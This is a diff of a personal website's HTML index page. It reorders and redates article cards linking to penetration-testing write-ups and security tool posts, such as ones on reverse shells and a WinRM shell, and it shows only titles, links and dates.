+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
     </footer>
   </a>
 </article>
@@ -1500,6 +1104,26 @@ root</code></pre></div></div></p>
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
           
            
            
@@ -1517,20 +1141,148 @@ root</code></pre></div></div></p>
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1560,17 +1312,41 @@ root</code></pre></div></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
     </footer>
   </a>
 </article>
@@ -1589,6 +1365,298 @@ root</code></pre></div></div></p>
            
            
           
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -1798,6 +1866,335 @@ root</code></pre></div></div></p>
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
+      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Apr 2018</time>
+      <time lang="el">22 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
+      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Apr 2018</time>
+      <time lang="el">09 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -2074,376 +2471,6 @@ root</code></pre></div></div></p>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/xor_kpa/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/keylock.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Known-plaintext attack tool for XOR-encrypted data</h3>
-      <h3 class="title" lang="el">Εργαλείο επιθέσεων γνωστού αρχικού κειμένου έναντι XOR-κρυπτογραφημένων δεδομένων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Apr 2018</time>
-      <time lang="el">22 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
